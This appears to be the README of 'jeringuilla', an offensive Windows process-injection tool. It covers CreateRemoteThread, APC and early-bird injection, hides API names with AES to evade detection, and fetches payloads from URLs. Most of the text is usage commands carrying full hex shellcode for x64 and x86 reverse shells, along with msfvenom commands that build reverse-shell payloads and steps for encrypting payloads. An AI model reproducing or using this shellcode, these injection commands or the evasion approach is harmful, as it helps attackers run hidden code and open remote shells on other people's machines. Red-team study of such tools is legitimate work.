# jeringuilla

Tool for easy process injection. It implements several types of process injection and uses dynamic function loading using delegates and AES to encrypt all the strings, so the function names are not easiliy retrievable.
- Process listing: By process name or process owner
- Payload: As input argument or using a url to download it. It can be AES-encrypted using payloadEncryptor.exe
- Process injection via:
    - Type "inject-crt": OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    - Type "inject-apc": OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC 
    - Type "earlybird":  CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread


The program does not use the GetProcAddress and GetModuleHandle, it uses custom implementations for these functions ([GetProcAddress](https://github.com/ricardojoserf/GetProcAddress) and [GetModuleHandle](https://github.com/ricardojoserf/GetModuleHandle)). The only API calls are NtReadVirtualMemory and NtQueryInformationProcess and the function names are obfuscated using AES encryption. 

--------------------------------------

### List process

Option "list" to enumerate all processes or filter by name or owner:

```
jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER ]
```

Example - List all processes:

```
jeringuilla.exe list all
```

Example - List processes with a specific name ("explorer") or process owner ("DESKTOP-MA54241\ricardo"):

```
jeringuilla.exe list explorer
jeringuilla.exe list "DESKTOP-MA54241\ricardo"
```
![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_1.png)

--------------------------------------

###  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url.

```
jeringuilla.exe inject-crt [ (PROCESS_NAME PROCESS_OWNER) | PROCESS_PID ]  [ HEXADECIMAL_PAYLOAD | URL ]
```

Example - Injection using process name, process owner and payload in HEX format:

```
jeringuilla.exe inject-crt explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_2.png)

Example - Injection using PID and a url to download the payload:

```
jeringuilla.exe inject-crt 9408 http://127.0.0.1/payload.bin
```
![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_3.png)

--------------------------------------

###  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)

You can use the process name and owner, or the PID. The payload can be in HEX format or a url to download it, if not the program asks for a value/url. 

For this one you must wait until the thread enters in alertable state, you can try it using Notepad and the option "Save as".

```
jeringuilla.exe inject-apc [ (PROCESS_NAME PROCESS_OWNER) | PROCESS_PID ] [ HEXADECIMAL_PAYLOAD | URL]
```

Example - Injection using process name, process owner and payload in HEX format:

```
jeringuilla.exe inject-apc explorer "DESKTOP-MA54241\ricardo" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

Example - Injection using PID and a url to download the payload:

```
jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
```


--------------------------------------

###  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)

You only set the program path. The payload can be in HEX format or a url to download it, if not the program asks for a payload or url.

```
jeringuilla.exe earlybird PROGRAM_PATH [ HEXADECIMAL_PAYLOAD | URL ]
```

Example - Injection using program path and payload in HEX format:

```
jeringuilla.exe earlybird "c:\windows\system32\notepad.exe" fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_4.png)

If you are using the 32-bit binary you need a 32-bit payload:

```
jeringuilla.exe earlybird "c:\windows\system32\notepad.exe" fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a05687f000001680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
```

Example - Injection using program path and a url to download the payload:

```
jeringuilla.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payload.bin
```

--------------------------------------

### Payload generation

You can use your custom payloads or use Msfvenom. In case you use the HEX payload option you must delete all "\x" or similar characters. If you use the url option the payload must be in RAW format.

Example - Create payload in HEX format using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\x' | tr -d '"\n\\x;'
```

Example - Create payload in RAW format for url option using Msfvenom with:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin
```

--------------------------------------

### AES Encryption

Both the HEX and RAW payloads in previous examples can be encrypted using AES with payloadEncryptor.exe. 

To change the AES password and IV you must update these variables in both jeringuilla and payloadEncryptor code:

```
static String payload_aes_password = "ricardojoserf123ricardojoserf123";
static String payload_aes_iv = "jeringa1jeringa1";
``` 

To encrypt a HEX payload:

```
payloadEncryptor.exe hex HEXADECIMAL_PAYLOAD
```

Example:

```
payloadEncryptor.exe hex fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115c7f00000141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_6.png)

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_7.png)


To encrypt a RAW payload:

```
payloadEncryptor.exe raw INPUTFILE OUTPUTFILE
```

Example:

```
payloadEncryptor.exe raw payload.bin payload_encrypted.bin
```

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_8.png)

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_9.png)

